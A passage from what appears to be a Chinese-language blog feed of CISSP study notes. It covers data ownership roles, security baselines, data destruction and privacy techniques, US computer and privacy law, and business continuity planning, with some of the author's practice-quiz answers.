class="headerlink" title="5.4.1 数据所有者"></a>5.4.1 数据所有者</h2><p>数据所有者（data owner）是对数据负有最终组织责任的人。</p><p>所有者通常是高管，也就是首席运营官（CEO）、总裁或部门主管（DH）</p><p>数据所有者识别数据的分类，并确保被正确标记；确保在分类和组织安全策略上要求的基础上有足够的安全控制。</p><p>所有者需要对数据敏感材料进行尽职审查。</p><h3 id="所有者职责"><a href="#所有者职责" class="headerlink" title="所有者职责"></a>所有者职责</h3><ul><li>建立适当使用和保护主体数据&#x2F;信息的规则（行为规则）</li><li>向信息系统所有者提供有关信息所在系统的安全要求和安全控制输入（安全措施）</li><li>决定谁可以访问，以及具备哪些类型的特权或访问权限（授权）</li><li>协助识别和评估信息驻留环境的通用安全控制</li></ul><h2 id="5-4-2-资产所有者"><a href="#5-4-2-资产所有者" class="headerlink" title="5.4.2 资产所有者"></a>5.4.2 资产所有者</h2><p>资产所有者（系统所有者）是拥有处理敏感数据的资产或系统的人员。</p><h3 id="系统所有者职责"><a href="#系统所有者职责" class="headerlink" title="系统所有者职责"></a>系统所有者职责</h3><ul><li>与信息所有者、系统管理员和功能的最终用户协作开发系统安全计划</li><li>维护系统安全计划，确保系统按照约定的安全要求部署和运行</li><li>确保系统用户和支持人员接受适当的安全培训，如行为规则指导</li><li>在发生重大变化时更新系统安全计划</li><li>协助识别、实施和评估通用安全控制</li></ul><h3 id="系统所有者负责项"><a href="#系统所有者负责项" class="headerlink" title="系统所有者负责项"></a>系统所有者负责项</h3><ul><li>确保系统中处理的数据的安全性，包括出系统处理的最高级别数据</li><li>确保系统被准确地标记，并提供相应的安全控制措施以保护数据</li><li>与数据所有者交流，确保数据被保存在系统中时、传输时和使用时都受到保护</li></ul><h2 id="5-4-3-业务-任务所有者"><a href="#5-4-3-业务-任务所有者" class="headerlink" title="5.4.3 业务&#x2F;任务所有者"></a>5.4.3 业务&#x2F;任务所有者</h2><p>NIST 定义业务&#x2F;任务所有者为项目经理或信息系统所有者。</p><p>业务所有者也可以使用被其他实体管理的系统。</p><p>业务所有者的责任是确保各个系统能为企业提供价值。</p><p>需要关注比较成本中心和利润中心之间的冲突。</p><p>通常使用 IT 治理方法，如信息和相关技术控制目标（COBIT）等，帮助企业所有者和任务所有者平衡安全控制要求与业务需求之间的关系。</p><h2 id="5-4-4-数据处理者和数据控制者"><a href="#5-4-4-数据处理者和数据控制者" class="headerlink" title="5.4.4 数据处理者和数据控制者"></a>5.4.4 数据处理者和数据控制者</h2><h3 id="数据控制者"><a href="#数据控制者" class="headerlink" title="数据控制者"></a>数据控制者</h3><p>控制数据处理的个人或实体，决定处理什么数据，为什么处理这个数据，以及如何处理。</p><h3 id="数据处理者"><a href="#数据处理者" class="headerlink" title="数据处理者"></a>数据处理者</h3><p>代表数据控制者处理个人数据的自然人或法人、公共权力机构、代理机构或其他机构。</p><p>GDPR 限制欧盟组织向欧盟以外的国家传输数据。</p><p>GDPR 规定，任何必须遵守 GDPR 的组织都必须设置数据保护官。</p><h2 id="5-4-5-数据托管员"><a href="#5-4-5-数据托管员" class="headerlink" title="5.4.5 数据托管员"></a>5.4.5 数据托管员</h2><p>数据所有者常将日常任务委托给数据托管员（custodian）</p><p>托管员通过正确存储和保护数据来帮助保护数据的完整性和安全性。</p><p>IT部门员工或系统管理员可能充当数据托管员。</p><h2 id="5-4-6-管理员"><a href="#5-4-6-管理员" class="headerlink" title="5.4.6 管理员"></a>5.4.6 管理员</h2><p>任何具有高级权限的人员会被视为管理员</p><p>数据角色中，数据管理员可能是数据托管员或其他数据角色的人员。</p><h2 id="5-4-7-用户和主体"><a href="#5-4-7-用户和主体" class="headerlink" title="5.4.7 用户和主体"></a>5.4.7 用户和主体</h2><p>用户：通过计算机系统访问数据以完成工作任务的人。</p><p>用户只能访问有限数据，员工也视为用户。</p><p>用户数据更广泛的主体类别。</p><p>主体是访问文件或文件夹等客体的任何实体。</p><p>GDPR 将数据主体（不仅仅是主体）定义为可以通过标识符识别的个人。</p><h1 id="5-5-使用安全基线"><a href="#5-5-使用安全基线" class="headerlink" title="5.5 使用安全基线"></a>5.5 使用安全基线</h1><p>安全基线用于保护资产。</p><p>安全基线提供一个基点并确保了最低安全标准。</p><p>组织常用安全基线是 映像&#x2F;镜像。</p><p>NIST 定义安全基线：</p><p>一组为信息系统定义的最小化的安全控制列表。</p><p>一套单独的安全控制措施并不适用于所有情况，可以选择一组进行定制。</p><h3 id="安全基线类别"><a href="#安全基线类别" class="headerlink" title="安全基线类别"></a>安全基线类别</h3><h4 id="低影响的基线"><a href="#低影响的基线" class="headerlink" title="低影响的基线"></a>低影响的基线</h4><p>保密性、完整性或可用性遭到破坏后对组织的使命产生较小的影响，</p><p>则建议使用低影响的基线控制。</p><h4 id="中影响的基线"><a href="#中影响的基线" class="headerlink" title="中影响的基线"></a>中影响的基线</h4><p>保密性、完整性或可用性遭到破坏后对组织的使命产生中等的影响，</p><p>则建议使用中影响的基线控制。</p><h4 id="高影响的基线"><a href="#高影响的基线" class="headerlink" title="高影响的基线"></a>高影响的基线</h4><p>保密性、完整性或可用性遭到破坏后对组织的使命产生严重的影响，</p><p>则建议使用高影响的基线控制。</p><h4 id="隐私控制基线"><a href="#隐私控制基线" class="headerlink" title="隐私控制基线"></a>隐私控制基线</h4><p>为处理 PII 的任何系统提供初始基线。</p><p>可以和其他基线结合使用。</p><p>不同级别基线是叠加使用的。</p><p>低影响的许多安全控制措施都是基础性的安全措施。</p><h2 id="5-5-1-对比定制和范围界定"><a href="#5-5-1-对比定制和范围界定" class="headerlink" title="5.5.1 对比定制和范围界定"></a>5.5.1 对比定制和范围界定</h2><p>确定基线</p><p>定制（tailoring）和范围界定（scoping）流程对基线进行微调。</p><h3 id="定制"><a href="#定制" class="headerlink" title="定制"></a>定制</h3><p>指修改基线内的安全控制列表以使其符合组织的使命。</p><h4 id="定制包括的活动"><a href="#定制包括的活动" class="headerlink" title="定制包括的活动"></a>定制包括的活动</h4><ul><li>识别和指定通用控制措施</li><li>应用范围界定事项</li><li>选择补充性控制</li><li>分配控制措施价值</li></ul><p>选定的基线可能不包括通常实施的控制措施。</p><p>不适用或不可行的基线，可以使用补偿性安全控制来为远程站点定制基线。</p><h3 id="范围界定"><a href="#范围界定" class="headerlink" title="范围界定"></a>范围界定</h3><p>审查基线安全控制列表，并且仅选择适用于要保护 IT  系统的安全控制措施。</p><p>保留可用的，删除不适用的。</p><h2 id="选择标准"><a href="#选择标准" class="headerlink" title="选择标准"></a>选择标准</h2><p>确保安全控制措施符合外部安全标准，也就是组织定义强制性要求。</p><h1 id="5-7-考试要点"><a href="#5-7-考试要点" class="headerlink" title="5.7 考试要点"></a>5.7 考试要点</h1><h2 id="理解数据和资产分类的重要性"><a href="#理解数据和资产分类的重要性" class="headerlink" title="理解数据和资产分类的重要性"></a>理解数据和资产分类的重要性</h2><p>数据所有者负责维护数据和资产分类，并确保数据和系统被正确标记。</p><p>数据所有者明确了对不同分类数据的保护要求，比如对静态和传输中敏感数据进行加密。</p><p>数据分类通常在安全策略或数据策略中定义。</p><h2 id="PII-和-PHI-定义"><a href="#PII-和-PHI-定义" class="headerlink" title="PII 和 PHI 定义"></a>PII 和 PHI 定义</h2><p>个人身份信息（PII）能够识别个人的任何信息。</p><p>受保护的健康信息（PHI）是特定人员的任何与健康相关的信息。</p><p>许多法律法规要求保护 PII 和 PHI。</p><h2 id="了解如何管理敏感信息"><a href="#了解如何管理敏感信息" class="headerlink" title="了解如何管理敏感信息"></a>了解如何管理敏感信息</h2><p>敏感信息可以是任何类型的分类信息，适当的管理有助于防止未经授权的泄露导致保密性被破坏。</p><p>正确的管理包括对敏感信息的标识、处理、存储和销毁。</p><p>组织经常遗漏的两个方面是：充分保护保存敏感信息的备份介质，并在其生命周期结束时对介质或设备进行净化。</p><h2 id="描述数据的三种状态"><a href="#描述数据的三种状态" class="headerlink" title="描述数据的三种状态"></a>描述数据的三种状态</h2><p>数据的三种状态是静态、传输中和使用中。</p><p><strong>静态数据</strong>是存储在系统硬盘或者外部介质等介质上的任何数据。</p><p><strong>传输中的数据</strong>是 通过网络传输的任何数据。</p><p>加密方法可以保护静态数据和传输中的数据。</p><p><strong>使用中的数据</strong>是指应用程序所使用的内存或临时存储缓冲区中的数据。</p><p>应用程序应该在不再需要数据时刷新内存缓冲区以删除数据。</p><h2 id="定义-DLP"><a href="#定义-DLP" class="headerlink" title="定义 DLP"></a>定义 DLP</h2><p>数据丢失预防（DLP）系统通过扫描未加密数据以查找关键字和数据模式来检测和阻止数据泄露的尝试。</p><p>基于网络的 DLP 系统（包括基于云的 DLP 系统）会在文件离开网络之前对其进行扫描。</p><p>基于终端的 DLP 系统会阻止用户复制或打印某些文件。</p><h2 id="比较数据销毁方法"><a href="#比较数据销毁方法" class="headerlink" title="比较数据销毁方法"></a>比较数据销毁方法</h2><p>擦除文件的操作并不会删除该文件。</p><p>清理介质是指用字符或者比特位来覆写介质。</p><p>清除过程将多次重复清理过程并删除数据，以使介质可被重复使用。</p><p>消磁可以从磁带和磁性硬盘驱动器中删除数据，但是消磁不影响光盘 CD、DVD 或 SSD。</p><p>销毁方法包括焚烧、粉碎、分解和溶解。</p><h2 id="描述数据残留"><a href="#描述数据残留" class="headerlink" title="描述数据残留"></a>描述数据残留</h2><p>数据残留是本应该被删除但仍然遗留在介质上的数据。</p><p>硬盘驱动器有时候会保留可以被高级工具读取到的剩余磁通。</p><p>高级工具可以读取磁盘上的剩余空间，即磁盘集群中未使用的空间。</p><p>擦除磁盘上的数据时会出现数据残留。</p><h2 id="理解记录保留策略"><a href="#理解记录保留策略" class="headerlink" title="理解记录保留策略"></a>理解记录保留策略</h2><p>记录保留策略确保数据在被需要时保持可用状态，并在其不再被需要时将其销毁。</p><p>许多法律法规要求组织在特定的时间段内保存数据，但在没有正式规定的情况下，组织根据策略确定保留期限。</p><p>审计踪迹数据需要被保持足够长的时间以重构过去的事件，但组织必须确定他们要调查的是多久之前发生的事情。</p><p>许多组织目前的趋势是通过实施电子邮件短期保留策略来减少法律责任。</p><h2 id="了解-EOL-和-EOS-之间的区别"><a href="#了解-EOL-和-EOS-之间的区别" class="headerlink" title="了解 EOL 和 EOS 之间的区别"></a>了解 EOL 和 EOS 之间的区别</h2><p>生产期终止（EOL）是供应商宣布停止销售产品的日志。</p><p>供应商在 EOL 之后仍然对该产品提供支持。</p><p>支持期终止（EOS）代表着供应商不再对产品提供支持的日期。</p><h2 id="解释-DRM"><a href="#解释-DRM" class="headerlink" title="解释 DRM"></a>解释 DRM</h2><p>数字版权管理（DRM）方法为受版权保护的作品提供版权保护。</p><p>目的是防止未经授权使用、修改和分发受版权保护的作品。</p><h2 id="解释-CASB"><a href="#解释-CASB" class="headerlink" title="解释 CASB"></a>解释 CASB</h2><p>云访问安全代理（CASB）在逻辑上处于用户和云资源之间。</p><p>可以将内部安全控制应用于云资源。</p><p>CASB 组件可被部署在本地或云端。</p><h2 id="定义假名化"><a href="#定义假名化" class="headerlink" title="定义假名化"></a>定义假名化</h2><p>假名化是用假名或别名替换某些数据元素的过程。</p><p>它删除隐私数据，以便相关人员共享数据集。</p><p>但是，原始数据在单独的数据集中仍然可用。</p><h2 id="定义令牌化"><a href="#定义令牌化" class="headerlink" title="定义令牌化"></a>定义令牌化</h2><p>令牌化用字符串或令牌来替换数据元素。</p><p>信用卡处理器用令牌替换信用卡数据，第三方持有到原始数据和令牌的映射。</p><h2 id="定义匿名化"><a href="#定义匿名化" class="headerlink" title="定义匿名化"></a>定义匿名化</h2><p>匿名化将隐私数据替换为有用但不准确的数据。</p><p>数据集可被共享并用于分析目的，但匿名化会删除个人身份。</p><p>匿名化是永久性的。</p><h2 id="了解数据角色的职责"><a href="#了解数据角色的职责" class="headerlink" title="了解数据角色的职责"></a>了解数据角色的职责</h2><p>数据所有者负责数据的分类、标记和保护。</p><p>系统所有者负责处理数据的系统。</p><p>业务&#x2F;任务拥有者拥有流程并确保系统为组织提供价值。</p><p>数据控制者决定要处理哪些数据以及如何处理这些数据。</p><p>数据处理者通常是在数据控制者的指导下为组织进行数据处理的第三方实体。</p><p>管理员根据数据所有者提供的指南授予对数据的访问权限。</p><p>用户或主体在执行任务时访问数据。</p><p>数据托管员承担保护和存储数据的日常职责。</p><h2 id="了解安全控制基线"><a href="#了解安全控制基线" class="headerlink" title="了解安全控制基线"></a>了解安全控制基线</h2><p>安全控制基线提供了可被组织用作基线的控制列表。</p><p>并非所有基线都适用于所有组织。</p><p>组织可应用范围界定和定制技术使基线适应自己的需求。</p><h1 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h1><p>数据标签、数据分类、数据处理</p><p>数据角色</p><p>匿名化、假名化、收集限制</p><p>磁盘处理：覆写、格式化、消磁</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>4-域1安全与风险管理 - 法律、法规和合规</title>
    <link href="/2025/04/27/security/seccert/cissp/4-%E5%9F%9F1%E5%AE%89%E5%85%A8%E4%B8%8E%E9%A3%8E%E9%99%A9%E7%AE%A1%E7%90%86%20-%20%E6%B3%95%E5%BE%8B%E3%80%81%E6%B3%95%E8%A7%84%E5%92%8C%E5%90%88%E8%A7%84/"/>
    <url>/2025/04/27/security/seccert/cissp/4-%E5%9F%9F1%E5%AE%89%E5%85%A8%E4%B8%8E%E9%A3%8E%E9%99%A9%E7%AE%A1%E7%90%86%20-%20%E6%B3%95%E5%BE%8B%E3%80%81%E6%B3%95%E8%A7%84%E5%92%8C%E5%90%88%E8%A7%84/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p><strong>确保能简要描述本章讨论的每项法律的用途</strong>。</p><h1 id="4-1-法律的分类"><a href="#4-1-法律的分类" class="headerlink" title="4.1 法律的分类"></a>4.1 法律的分类</h1><p>三种主要的法律类型，每种法律被用来应对不同的情况。</p><h2 id="4-1-1-刑法"><a href="#4-1-1-刑法" class="headerlink" title="4.1.1 刑法"></a>4.1.1 刑法</h2><p>刑法是维护和平、保障社会安全的法律体系的基石。</p><p>刑法的触发存在范围：</p><ul><li>强制时长的社区服务</li><li>货币形式的罚款</li><li>监禁形式对公民自由的剥夺</li></ul><p>各级政府立法机构通过选举产生的代表制定刑法。</p><p>所有联邦和州的法律都必须遵守美国的最高法律《美国宪法》</p><h2 id="4-1-2-民法"><a href="#4-1-2-民法" class="headerlink" title="4.1.2 民法"></a>4.1.2 民法</h2><p>民法是美国法律体系的主体，用于维护社会秩序，管理不属于犯罪行为但需要由公正的仲裁者解决个人和组织间的问题。</p><p>常见民法事项类型：</p><ul><li>合同纠纷</li><li>房地产交易</li><li>雇佣问题</li><li>财产&#x2F;遗嘱公证程序</li></ul><p>制定方式与刑法相同，通过立法程序，受宪法条款和司法审查程序约束。</p><p><strong>民法和刑法主要区别在于执行方式</strong></p><h2 id="4-1-3-行政法"><a href="#4-1-3-行政法" class="headerlink" title="4.1.3 行政法"></a>4.1.3 行政法</h2><p>行政法不需要通过立法部门的行动来获得法律效力，必须符合所有现有民法和刑法。</p><p>行政法规也必须符合美国宪法的规定并接受司法审查。</p><h1 id="4-2-法律"><a href="#4-2-法律" class="headerlink" title="4.2 法律"></a>4.2 法律</h1><p>每个信息安全专业人员都应该对与信息技术相关的法律有基本了解。</p><h2 id="4-2-1-计算机犯罪"><a href="#4-2-1-计算机犯罪" class="headerlink" title="4.2.1 计算机犯罪"></a>4.2.1 计算机犯罪</h2><h3 id="1-《计算机欺诈和滥用法案》CFAA"><a href="#1-《计算机欺诈和滥用法案》CFAA" class="headerlink" title="1. 《计算机欺诈和滥用法案》CFAA"></a>1. 《计算机欺诈和滥用法案》CFAA</h3><p>《计算机欺诈和滥用法案》CFAA 是美国针对网络犯罪的第一项重要立法。</p><p>1984年颁布</p><p>CFAA 措辞谨慎，专门针对跨越州界的计算机犯罪，以免侵犯各州权利和触犯宪法。</p><p>适用范围：</p><ul><li>美国政府专用的计算机</li><li>金融机构专用的计算机</li><li>政府或金融机构使用的计算机，如果其被破坏，会妨碍政府或金融机构使用系统</li><li>被组合起来实施犯罪的不在同一个州的所有计算机</li></ul><h3 id="2-CFAA-修正案"><a href="#2-CFAA-修正案" class="headerlink" title="2. CFAA 修正案"></a>2. CFAA 修正案</h3><p>《1994年计算机滥用修正案》</p><p>1994年颁布</p><h1 id="4-6-考试要点"><a href="#4-6-考试要点" class="headerlink" title="4.6 考试要点"></a>4.6 考试要点</h1><h2 id="了解刑法、民法和行政法的区别"><a href="#了解刑法、民法和行政法的区别" class="headerlink" title="了解刑法、民法和行政法的区别"></a>了解刑法、民法和行政法的区别</h2><p><strong>刑法</strong>使社会免受违反我们信仰的基本原则行为的侵害。</p><p>违反刑法的行为将由美观联邦和州政府进行起诉。</p><p><strong>民法</strong>为人与组织之间的商业交易提供了框架。</p><p>违反民法的行为将通过法庭，由受影响的当事人进行辩论。</p><p><strong>行政法</strong>是政府机构用来有效地执行日常事务的法律。</p><h2 id="能够解释旨在使社会免受计算机犯罪的主要法律的基本条款"><a href="#能够解释旨在使社会免受计算机犯罪的主要法律的基本条款" class="headerlink" title="能够解释旨在使社会免受计算机犯罪的主要法律的基本条款"></a>能够解释旨在使社会免受计算机犯罪的主要法律的基本条款</h2><p>《计算机欺诈和滥用法案》（修正案）保护政府或州际贸易中使用的计算机，使其不被滥用。</p><p>《电子通信隐私法案》（ECPA）规定，侵犯个人的电子隐私行为是犯罪行为。</p><h2 id="了解版权、商标、专利和商业秘密之间的区别"><a href="#了解版权、商标、专利和商业秘密之间的区别" class="headerlink" title="了解版权、商标、专利和商业秘密之间的区别"></a>了解版权、商标、专利和商业秘密之间的区别</h2><h3 id="版权"><a href="#版权" class="headerlink" title="版权"></a>版权</h3><p>保护创作者的原创作品，如书籍、文章、诗歌和歌曲。</p><h3 id="商标"><a href="#商标" class="headerlink" title="商标"></a>商标</h3><p>标识公司、产品或服务的名称、标语和标志。</p><h3 id="专利"><a href="#专利" class="headerlink" title="专利"></a>专利</h3><p>为新发明的创造者提供保护。</p><h3 id="商业秘密"><a href="#商业秘密" class="headerlink" title="商业秘密"></a>商业秘密</h3><p>保护企业的经营秘密。</p><h2 id="能够解释1998年颁布的《数字千年版权法》的基本条款"><a href="#能够解释1998年颁布的《数字千年版权法》的基本条款" class="headerlink" title="能够解释1998年颁布的《数字千年版权法》的基本条款"></a>能够解释1998年颁布的《数字千年版权法》的基本条款</h2><p>《数字千年版权法》禁止绕过数字媒体中的版权保护机制的行为，并限制互联网服务提供商对用户活动的责任。</p><h2 id="了解《经济间谍法案》的基本条款"><a href="#了解《经济间谍法案》的基本条款" class="headerlink" title="了解《经济间谍法案》的基本条款"></a>了解《经济间谍法案》的基本条款</h2><p>《经济间谍法案》对窃取商业秘密的个人进行惩罚。</p><p>当窃取者知道外国政府将从这些信息中获益而故意为之时，会受到更严厉的惩罚。</p><h2 id="了解不同类型的软件许可协议"><a href="#了解不同类型的软件许可协议" class="headerlink" title="了解不同类型的软件许可协议"></a>了解不同类型的软件许可协议</h2><p>合同许可协议是软件供应商和用户之间的书面协议。</p><p>开封生效许可协议被写在软件包装上，在用户打开包装时生效。</p><p>单击生效许可协议包含在软件包中，但要求用户在软件安装过程中接受这些条款。</p><h2 id="理解对遭受数据破坏的组织的通告要求"><a href="#理解对遭受数据破坏的组织的通告要求" class="headerlink" title="理解对遭受数据破坏的组织的通告要求"></a>理解对遭受数据破坏的组织的通告要求</h2><p>加州颁发的 SB 1386 是第一个在全州范围内要求信息泄露的情况通知当事人的法律。</p><p>美国目前大多数州通过了类似法律。</p><p>目前，联邦法律只要求受 HIPAA 约束的实体在其保护的个人健康信息被破坏时将相关事实通知到个人。</p><h2 id="理解美国、欧盟和加拿大管理个人信息隐私的主要法律"><a href="#理解美国、欧盟和加拿大管理个人信息隐私的主要法律" class="headerlink" title="理解美国、欧盟和加拿大管理个人信息隐私的主要法律"></a>理解美国、欧盟和加拿大管理个人信息隐私的主要法律</h2><p>美国有许多隐私法律会影响政府对信息的使用以及特定行业（如处理敏感信息的金融服务公司和医疗健康组织）的信息使用。</p><p>欧盟有非常全面的《通用数据保护条例》GDPR 来管理对个人信息的使用和交换。</p><p>在加拿大，《个人信息保护和电子文件法》（PIPEDA）管理个人信息的使用。</p><h2 id="解释全面合规程序的重要性"><a href="#解释全面合规程序的重要性" class="headerlink" title="解释全面合规程序的重要性"></a>解释全面合规程序的重要性</h2><p>大多数组织都受制于与信息安全相关的各种法律和法规要求。</p><p>构建合规性程序以确保你能实现并始终遵守这些经常重叠的合规需求。</p><h2 id="了解如何将安全纳入采购和供应商管理流程"><a href="#了解如何将安全纳入采购和供应商管理流程" class="headerlink" title="了解如何将安全纳入采购和供应商管理流程"></a>了解如何将安全纳入采购和供应商管理流程</h2><p>许多组织广泛使用云服务，需要在供应商选择过程中以及在持续供应商管理过程中对信息安全控制进行审查。</p><h2 id="能够确定信息保护的合规性和其他要求"><a href="#能够确定信息保护的合规性和其他要求" class="headerlink" title="能够确定信息保护的合规性和其他要求"></a>能够确定信息保护的合规性和其他要求</h2><p>网络安全专业人员必须能够分析情况并确定适用的司法管辖区和法律。</p><p>网络安全专业人员必须能够识别相关的合同、法律、监管和行业标准，并根据特定情况对其进行解释。</p><h2 id="了解法律和监管问题以及它们与信息安全的关系"><a href="#了解法律和监管问题以及它们与信息安全的关系" class="headerlink" title="了解法律和监管问题以及它们与信息安全的关系"></a>了解法律和监管问题以及它们与信息安全的关系</h2><p>了解网络犯罪和数据泄露的概念，并能够在事件发生时将它们应用到环境中。</p><p>了解哪些许可和知识产权保护适用于组织的数据以及在遇到属于其他组织的数据时应承担的义务。</p><p>了解与跨国界传输信息相关的隐私和出口管制问题。</p><h1 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h1><p> 商务部工业和安全局（BIS）</p><p>FISMA</p><p>CALEA</p><p>第四修正案、隐私法案、第二修正案、GLB法案</p><p>版权、商标、专利、商业秘密</p><p>HIPAA</p><p>1</p><p>B  A D A B</p><p>C     </p><p>B C D C A</p><p>   A </p><p>D A D D C</p><p>​          B  B</p><p>B B C C D </p><p>   C </p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>3-域1安全与风险管理+域7安全运营-业务连续性计划</title>
    <link href="/2025/04/27/security/seccert/cissp/3-%E5%9F%9F1%E5%AE%89%E5%85%A8%E4%B8%8E%E9%A3%8E%E9%99%A9%E7%AE%A1%E7%90%86+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E4%B8%9A%E5%8A%A1%E8%BF%9E%E7%BB%AD%E6%80%A7%E8%AE%A1%E5%88%92/"/>
    <url>/2025/04/27/security/seccert/cissp/3-%E5%9F%9F1%E5%AE%89%E5%85%A8%E4%B8%8E%E9%A3%8E%E9%99%A9%E7%AE%A1%E7%90%86+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E4%B8%9A%E5%8A%A1%E8%BF%9E%E7%BB%AD%E6%80%A7%E8%AE%A1%E5%88%92/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>业务连续性（business continuity，BC）计划</p><p>灾难恢复（disaster recovery，DR）计划</p><p>1 B✅</p><p>C✅</p><p>C✅</p><p>D✅</p><p>A✅</p><p>6 C✅</p><p>C✅</p><p>B✅</p><p>D✅</p><p>A✅</p><p>11 B❌ C</p><p>D✅</p><p>C✅</p><p>B✅</p><p>C✅</p><p>16 A❌ C</p><p>预备和处理阶段，BCP 团队设计流程和机制来减轻在策略开发阶段被认为不可接受的风险。</p><p>D✅</p><p>C✅</p><p>A✅</p><p>C✅</p><h1 id="3-1-业务连续性计划概述"><a href="#3-1-业务连续性计划概述" class="headerlink" title="3.1 业务连续性计划概述"></a>3.1 业务连续性计划概述</h1><p>BCP 涉及评估组织流程的风险，以及创建策略、计划和程序，以最大限度减少风险发生对组成产生的不良影响。</p><p>BCP 目标：</p><p>综合实施策略、程序和流程，将潜在的破坏事件对业务的影响降至最低。</p><h2 id="BCP-流程主要阶段"><a href="#BCP-流程主要阶段" class="headerlink" title="BCP 流程主要阶段"></a>BCP 流程主要阶段</h2><ul><li>项目范围和计划</li><li>业务影响分析</li><li>连续性计划</li><li>计划批准和实施</li></ul><p><strong>人员安全一直是 BCP 和 DRP 最先考虑的。</strong></p><h1 id="3-2-项目范围和计划"><a href="#3-2-项目范围和计划" class="headerlink" title="3.2 项目范围和计划"></a>3.2 项目范围和计划</h1><h2 id="规划的目标"><a href="#规划的目标" class="headerlink" title="规划的目标"></a>规划的目标</h2><ul><li>从危机规划的角度对业务组织进行结构分析。</li><li>在高级管理层的批准下创建 BCP 团队</li><li>评估可用于业务连续性活动的资源</li><li>分析在处理灾难性事件方面，组织需要遵守的法律以及所处的监管环境。</li></ul><p>目的：<br>确保组织投入足够的时间和精力来制订项目范围和计划。</p><h2 id="3-2-1-组织分析"><a href="#3-2-1-组织分析" class="headerlink" title="3.2.1 组织分析"></a>3.2.1 组织分析</h2><p>负责 BCP 的人员首要职责之一是对业务进行分析，识别相关部门和个人。</p><p><strong>需要考虑的范围</strong>：</p><ul><li>负责向客户提供核心服务业务的运营部门</li><li>关键支持服务部门，如 IT、设施和维护人员</li><li>负责物理安全的公司安全团队</li><li>高级管理人员和对组织持续运营来说至关重要的其他人员。</li></ul><p>识别过程重要的原因：</p><ul><li>确定 BCP 团队潜在的人员</li><li>为开展其他工作打下基础</li></ul><p>执行者可能的角色：</p><ul><li>外聘专职的业务连续性经理</li><li>IT 管理者</li></ul><p>BCP 团队建立后，需要对分析结果进行全面审查，确保正确。</p><p>提示：</p><p>需要考虑总部和分支结构位置</p><h2 id="3-2-2-选择-BCP-团队"><a href="#3-2-2-选择-BCP-团队" class="headerlink" title="3.2.2 选择 BCP 团队"></a>3.2.2 选择 BCP 团队</h2><p>BCP 团队需要包含的人员：</p><ul><li><strong>部分代表</strong>：负责执行业务核心服务的每个组织部门的代表</li><li><strong>业务代表</strong>：根据组织分析确定的来自不同职能区域的业务单元团队成员</li><li><strong>IT 专家</strong>：BCP 所涉及领域内拥有技术专长的 IT 专家</li><li><strong>网络安全</strong>：掌握 BCP 流程知识的网络安全团队成员</li><li><strong>物理安全</strong>：负责工程实体物理安全和设施管理的团队</li><li><strong>律师</strong>：熟悉公司法规、监管和合同责任的律师</li><li><strong>人力</strong>：可解决人员配置问题以及对员工个人产生影响的人力资源团队成员</li><li><strong>公共关系</strong>：需要制订类似的计划以确定在发生中断时如何与利益相关方和公众进行沟通的公共关系团队成员</li><li><strong>高管</strong>：高级管理层代表，设定愿景，确定优先级别和分配资源</li></ul><p><strong>BCP 需要得到高管的支持</strong></p><p>每个团队成员对 BCP 过程都有独特看法，存在个人倾向</p><p>需要进行协调和有效利用，有助于使计划健康的平衡，避免转变为破坏性的地盘斗争。</p><h2 id="3-2-3-资源需求"><a href="#3-2-3-资源需求" class="headerlink" title="3.2.3 资源需求"></a>3.2.3 资源需求</h2><p><strong>BCP 三个不同阶段所需资源</strong></p><p><strong>BCP 开发</strong></p><p>耗费人力资源，组建团队，创建计划付出的人力</p><p><strong>BCP 测试、培训和维护</strong></p><p>主要资源是人力资源，和部分硬件和软件资源</p><p><strong>BCP 实施</strong></p><p>主要资源是大量实施工作和直接的财务费用。</p><p>包括：人力、冗余计算设施的购买和部署。</p><p>需要用有条理的、逻辑严密的 BCP 业务案例观点来证明 BCP 计划的必要性。</p><h2 id="3-2-4-法律和法规要求"><a href="#3-2-4-法律和法规要求" class="headerlink" title="3.2.4 法律和法规要求"></a>3.2.4 法律和法规要求</h2><p>法律或法规要求 行业实施不同程度的 BCP。</p><p>多个法律法规对紧急情况下的持续运营提出了要求。</p><p>有必要让组织的法律顾问参与 BCP 过程，法律顾问非常熟悉适用于组织的法律、法规和合同义务。</p><h1 id="3-3-业务影响分析-BIA"><a href="#3-3-业务影响分析-BIA" class="headerlink" title="3.3 业务影响分析 BIA"></a>3.3 业务影响分析 BIA</h1><p>完成准备创建业务连续性计划的四个阶段，进入工作的核心部分，<strong>业务影响分析（business impact analysis，BIA）</strong>。</p><p><strong>BIA 确定 对组织持续运营能力而言非常关键的业务流程和任务以及这些资源面临的威胁。</strong></p><h2 id="分析方法"><a href="#分析方法" class="headerlink" title="分析方法"></a>分析方法</h2><h3 id="定量影响评估"><a href="#定量影响评估" class="headerlink" title="定量影响评估"></a>定量影响评估</h3><p>涉及使用数字和公式得出结论的过程。</p><p>结果通常用货币价值表示与业务相关的选项。</p><h3 id="定性影响评估"><a href="#定性影响评估" class="headerlink" title="定性影响评估"></a>定性影响评估</h3><p>考虑非数字因素，如声誉、投资者&#x2F;客户信心、员工稳定性和其他相关事项。</p><p>结果通常用优先级别（高、中、低）表示。</p><p>BCP 团队应该对影响 BCP 过程的因素进行定性分析。最好有高层的参与。</p><p><strong>风险评估和 BCP 区别</strong>：</p><p>风险评估流程侧重于单个资产</p><p>BCP 侧重于业务流程和任务</p><h2 id="3-3-1-确定优先级"><a href="#3-3-1-确定优先级" class="headerlink" title="3.3.1 确定优先级"></a>3.3.1 确定优先级</h2><p>第一个 BIA 任务：确定业务优先级</p><p>创建一份涵盖关键业务功能的综合列表，并按重要性对其进行排序。</p><p>定量分析，需要一起指定组织资产清单，并为每项资产分配货币形式的资产价值（AV）。</p><h3 id="MTD-MTO"><a href="#MTD-MTO" 